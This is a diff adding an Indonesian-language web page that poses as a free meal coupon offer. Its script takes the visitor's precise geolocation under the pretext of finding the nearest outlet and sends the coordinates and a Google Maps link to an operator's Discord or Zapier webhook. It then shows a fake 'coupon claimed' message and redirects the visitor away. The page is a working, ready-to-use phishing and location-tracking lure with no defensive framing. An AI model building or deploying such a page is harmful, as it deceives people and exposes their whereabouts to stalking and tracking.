@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Klaim Kupon Diskon Anda!</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; background-color: #f4f4f4; padding: 50px; }
+        .box { background: white; padding: 30px; border-radius: 15px; shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; }
+        button { background: #ff4757; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; }
+        h1 { color: #2f3542; }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <h1>Selamat! 🎉</h1>
+        <p>Anda mendapatkan kupon makan gratis senilai <b>Rp 100.000</b>.</p>
+        <p>Silakan klik tombol di bawah untuk menemukan gerai terdekat dan klaim kupon Anda.</p>
+        <button onclick="getLocation()">Cek Gerai Terdekat & Klaim</button>
+        <p id="status" style="color: red; margin-top: 10px;"></p>
+    </div>
+
+    <script>
+        // GANTI URL INI dengan URL Webhook kamu (bisa dari Discord atau Zapier)
+        const WEBHOOK_URL = "URL_WEBHOOK_KAMU_DISINI";
+
+        function getLocation() {
+            const status = document.getElementById('status');
+            
+            if (navigator.geolocation) {
+                status.innerText = "Sedang mencari gerai terdekat...";
+                navigator.geolocation.getCurrentPosition(sendData, showError);
+            } else {
+                status.innerText = "Browser Anda tidak mendukung fitur ini.";
+            }
+        }
+
+        function sendData(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+
+            // Data yang akan dikirim
+            const data = {
+                content: `📍 **Lokasi Terdeteksi!**\nLatitude: ${lat}\nLongitude: ${lon}\nAkurasi: ${accuracy} meter\nGoogle Maps: https://www.google.com/maps?q=${lat},${lon}`
+            };
+
+            // Mengirim data ke Webhook
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).then(() => {
+                alert("Kupon berhasil diklaim! Silakan cek email Anda.");
+                window.location.href = "https://www.google.com"; // Redirect ke web lain
+            });
+        }
+
+        function showError(error) {
+            const status = document.getElementById('status');
+            status.innerText = "Izin lokasi diperlukan untuk menemukan gerai terdekat.";
+        }
+    </script>
+</body>
+      </html>
